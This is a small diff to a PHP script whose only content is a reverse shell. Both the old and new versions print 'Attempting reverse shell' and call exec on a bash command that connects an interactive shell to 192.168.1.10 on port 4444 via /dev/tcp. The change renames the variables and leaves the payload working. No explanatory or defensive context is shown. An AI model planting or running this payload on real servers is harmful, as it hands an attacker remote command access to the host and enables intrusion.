@@ -1,6 +1,6 @@
 <?php
-  $vIP = "192.168.1.10";
-  $vPort = 4444;
-  print("  Attempting reverse shell to IP $vIP:$vPort...");
-  exec("/bin/bash -c 'bash -i >& /dev/tcp/$vIP/$vPort 0>&1'");
+  $vLocalIP = "192.168.1.10";
+  $vLocalPort = 4444;
+  print("  Attempting reverse shell to $vLocalIP:$vLocalPort...");
+  exec("/bin/bash -c 'bash -i >& /dev/tcp/$vLocalIP/$vLocalPort 0>&1'");
 ?>
